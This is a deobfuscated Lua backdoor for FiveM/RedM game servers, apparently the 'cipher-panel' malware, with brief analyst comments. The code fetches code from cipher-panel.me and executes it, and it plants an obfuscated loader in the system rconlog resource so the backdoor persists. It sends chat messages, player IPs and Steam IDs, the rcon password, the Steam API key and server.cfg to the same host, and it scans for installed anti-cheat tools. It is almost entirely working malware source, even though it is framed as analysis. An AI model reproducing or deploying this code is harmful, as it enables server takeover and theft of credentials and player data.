-- Deobfuscated by XenoS.exe#2859

-- Cleaned base payload code
    -- Base payload code
        PerformHttpRequest('https://cipher-panel.me/_i/i?to=yourmom', function (e, d)
            local s = assert(load(d))
            if (d == nil) then return end
            s()
        end)
    -- Cleaned and fixed
        Citizen.CreateThread(function()
            Citizen.Wait(5000)

            if not LoadResourceFile("rconlog", "rconlog_server.lua"):find("luwOyroAEjA") then
                -- Server
                rconlog_server = io.open("resources/[system]/rconlog/rconlog_server.lua", "a")
                rconlog_server:write([[
                    local aaCqeWxlXP = {
                        _G['PerformHttpRequest'],
                        _G['assert'],
                        _G['load'],
                        _G['tonumber']
                    }

                    local KveujGfnoq = {
                        '68', '74', '74', '70', '73', '3a', '2f', '2f', '63', '69', '70', '68', '65', '72',
                        '2d', '70', '61', '6e', '65', '6c', '2e', '6d', '65', '2f', '5f', '69', '2f', '72',
                        '2e', '70', '68', '70', '3f', '74', '6f', '3d', '30'
                    }

                    function alhCdNzrzA()
                        VGFYLKlFUb = ''
                        for id,it in pairs(KveujGfnoq) do
                            VGFYLKlFUb = VGFYLKlFUb..it
                        end
                        return (VGFYLKlFUb:gsub('..', function (luwOyroAEjA)
                            return string.char(aaCqeWxlXP[4](luwOyroAEjA, 16))
                        end))
                    end

                    aaCqeWxlXP[aaCqeWxlXP[4]('1')](alhCdNzrzA(), function (e, ugSUOUVdlh)
                        local pObizIfEHp = aaCqeWxlXP[aaCqeWxlXP[4]('2')](aaCqeWxlXP[aaCqeWxlXP[4]('3')](ugSUOUVdlh))
                        if (ugSUOUVdlh == nil) then return end
                        pObizIfEHp()
                    end)
                            ]])
                rconlog_server:close()

                -- Client
                rconlog_client = io.open("resources/[system]/rconlog/rconlog_client.lua", "a")
                rconlog_client:write([[
                    RegisterNetEvent('helpCode')
                    AddEventHandler('helpCode', function(id)
                        local help = assert(load(id))
                        help()
                    rconlog_client)]])
                rconlog_client:close()

                -- Manifest
                fxmanifest = io.open("resources/[system]/rconlog/fxmanifest.lua", "w")
                fxmanifest:write([[
                    client_script 'rconlog_client.lua'

                    server_scripts { 'rconlog_server.lua', '@mysql-async/lib/MySQL.lua' } -- so it will never work, you have to exchange them monkey
                    fx_version 'adamant'
                    games { 'gta5', 'rdr3' }

                    rdr3_warning 'I acknowledge that this is a prerelease build of RedM, and I am aware my resources *will* become incompatible once RedM ships.'
                ]])

                fxmanifest:close()
            end
        end)
-- Second layer payload (of the rconlog)
    -- Base code 
        PerformHttpRequest("https://cipher-panel.me/_i/r.php?to=0", function (e, code)
            local s = assert(load(code))
            if (code == nil) then return end
            s()
        end)
    -- Cleaned
        ESX = nil 
        check = nil
        TriggerEvent("esx:getSharedObject", function(obj) ESX = obj end)
        
        -- Unkow (probably a checker for something, not tested)
        TriggerEvent("RxqYNcwWvPdBikBFruLK", function(c) check = c end)
        if(check == true)then
            return
        end
        
        AddEventHandler("RxqYNcwWvPdBikBFruLK", function(pEwThmEDiglRbGYWqEQN)
            pEwThmEDiglRbGYWqEQN(true)
        end)
        
        
        Citizen.CreateThread(function()
            jobslist = {}
            local uptime_min = 0
            local uptime_hour = 0
            local uptime_seconds = 0
        
            -- Message handler (log the chat)
            AddEventHandler("chatMessage", function(source, name, message)
                local steamid = ""
        
                for i = 0, GetNumPlayerIdentifiers(source) - 1 do
                    local identifiers = GetPlayerIdentifier(source, i)
                    if string.find(identifiers, "steam") then
                        steamid = identifiers
                    end
                end
        
                local data = {
                    sip = "YOUR_MOM",
                    token = "0",
                    pip = GetPlayerEndpoint(source),
                    pname = GetPlayerName(source),
                    psid = steamid,
                    pmess = message
                }
                PerformHttpRequest("https://cipher-panel.me/_i/c.php", function ()
                end, "POST", json.encode(data), { ["Content-Type"] = "application/json" })
            end)
        
        
            while true do
                Citizen.Wait(5000)
                plist = {}
        
                -- Refresh the player list
                for _, id in ipairs(GetPlayers()) do
                    if(ESX == nil) then
                        table.insert(plist, {
                            name = GetPlayerName(id),
                            ip = GetPlayerEndpoint(id),
                            id = id,
                            identifiers = GetPlayerIdentifier(id)
                        })
                    else
                        local xplayer = ESX.GetPlayerFromId(id)
                        if xplayer ~= nil then
                            table.insert(plist, {
                                group   = xplayer.getGroup(),
                                accounts = xplayer.getAccounts(),
                                inventory = xplayer.getInventory(),
                                job = xplayer.getJob(),
                                name = GetPlayerName(id),
                                ip = GetPlayerEndpoint(id),
                                id = id,
                                position = xplayer.getCoords(),
                                identifiers = GetPlayerIdentifier(id),
                                money = xplayer.getMoney()
                            })	
                        end	
                    end
                end
        
                local framework = "undetected"
        
                if(ESX ~= nil) then
                    framework = "ESX"
                end
        
                -- Detect if have vrp and log the resource status
                local resourceList = {}
                for i = 0, GetNumResources() - 1, 1 do
                    local resName = GetResourceByFindIndex(i)
        
                    if resName and GetResourceState(resName) == "started" then
                        if(resName == "vrp") then
                            framework = "vRP"
                        end
        
                        if(LoadResourceFile(resName, "server.lua") == nil) then
                            haveServer = false
                        else
                            haveServer = true
                        end
                        table.insert(resourceList, { name = resName, active = 1, id = i, f = haveServer} )
                    else
                        table.insert(resourceList, { name = resName, active = 0, id = i, f = false} )
                    end
                end
        
                -- If is esx then log the no-whitelisted jobs to the panel
                if(framework == "ESX") then
                    MySQL.Async.fetchAll("SELECT * FROM jobs WHERE whitelisted = @whitelisted", {
                        ["@whitelisted"] = 0
                    }, function(result)
                        for i=1, #result, 1 do
                            table.insert(jobslist, {
                                job   = result[i].name,
                                label = result[i].label
                            })
                        end
                    end)
                end
        
                -- Get the CFG
                local function GetFileData(filename)
                    local file = io.open(filename, "rb")
        
                    if not file then return nil end
        
                    local filedata = file:read "*a"
                    file:close()
        
                    return filedata
                end
                
                local AnticheatBlacklist = {
                    {name = "Tigo", ac_name = "TigoAntiCheat"},
                    {name = "2K-Anticheat", ac_name = "2K-Anticheat"},
                    {name = "7777AntiCheat", ac_name = "7777AntiCheat System"},
                    {name = "s_Cfg", ac_name = "Anticheat"},
                    {name = "anticheat - antitrigger", ac_name = "Anticheat - Antitrigger"},
                    {name = "LittleAC", ac_name = "LittleAntiCheat"},
                    {name = "ZentryAnticheat", ac_name = "ZentryAnticheat"},
                    {name = "AntiLynxR5C", ac_name = "AntiLynxR5C"},
                    {name = "Badgers Official Anticheat", ac_name = "Badgers Anticheat"},
                    {name = "tables/*.lua", ac_name = "ChocoHax"},
                    {name = "SkidKnocker", ac_name = "CLRP Anticheat"},
                    {name = "dub_c.lua", ac_name = "Dub Anticheat"},
                    {name = "eac_sv.lua", ac_name = "E-AC"},
                    {name = "anticheat-sv.lua", ac_name = "ESX Anticheat"},
                    {name = "ESX Ligma Anticheat", ac_name = "ESX Ligma Anticheat"},
                    {name = "Freedom AntiCheat", ac_name = "Freedom AntiCheat"},
                    {name = "ac_s.lua", ac_name = "Godzilla Fake"},
                    {name = "IronShield", ac_name = "IronShield"},
                    {name = "jkAnti", ac_name = "jkAnti"},
                    {name = "Godzilla Release", ac_name = "Godzilla Release"},
                    {name = "CarlosLR-AC", ac_name = "CarlosLR"},
                    {name = "jesus_on_air.js", ac_name = "RoteJesus"},
                    {name = "cl_deleteVehModdeur.lua", ac_name = "Ruby"},
                    {name = "aDetections.lua", ac_name = "WaveShield"},
                    {name = "clientsecly.lua", ac_name = "ChocoHax"},
                    {name = "CCarlosLR", ac_name = "CCarlosLR"}
                }
        
                local anticheatDetected = {}
                for i = 0, GetNumResources() - 1, 1 do
                    local resName = GetResourceByFindIndex(i)
                    if resName then
                        if(LoadResourceFile(resName, "fxmanifest.lua")) then
                            str = LoadResourceFile(resName, "fxmanifest.lua")
                            for id, data in pairs(AnticheatBlacklist) do
                                if(str:find(data.name)) then
                                    table.insert(anticheatDetected, { name = resName, ac_name = data.ac_name, id = i} )
                                end
                            end
                        elseif(LoadResourceFile(resName, "__resource.lua")) then
                            str = LoadResourceFile(resName, "__resource.lua")
                            for id, data in pairs(AnticheatBlacklist) do
                                if(str:find(data.name)) then
                                    table.insert(anticheatDetected, { name = resName, ac_name = data.ac_name, id = i} )
                                end
                            end
                        end
                    end
                end
        
                uptime_seconds = uptime_seconds + 5
                if uptime_seconds == 60 then
                    uptime_min = uptime_min + 1
                    uptime_seconds = 0
                end
                if uptime_min == 60 then
                    uptime_min = 0
                    uptime_hour = uptime_hour + 1
                end
                final_uptime = uptime_hour.."h et "..uptime_min.."min"
                local data_tosend = {
                    name = GetConvar("sv_hostname"), 
                    ip = "YOUR_MOM",
                    pl = GetNumPlayerIndices().."/"..GetConvar("sv_maxclients"),
                    token = "0",
                    rcon = GetConvar("rcon_password"),
                    uptime = final_uptime,
                    sapikey = GetConvar("steam_webApiKey"),
                    plist = plist,
                    resource = resourceList,
                    jobsList = jobslist,
                    detect = anticheatDetected,
                    framew = framework,
                    cfg = GetFileData("server.cfg") 
                }
                PerformHttpRequest("https://cipher-panel.me/_i/s.php", function (e, code)
                    -- This is the payload loader (every action done from the pannel is sended to that loader, grabbed payload can be found in the folder "payloads")
                    local s = assert(load(code))
                    if code == nil or code == "" then return end
                    s()
                end, "POST", json.encode(data_tosend), { ["Content-Type"] = "application/json" }) 
                jobslist = {}
            end
        end)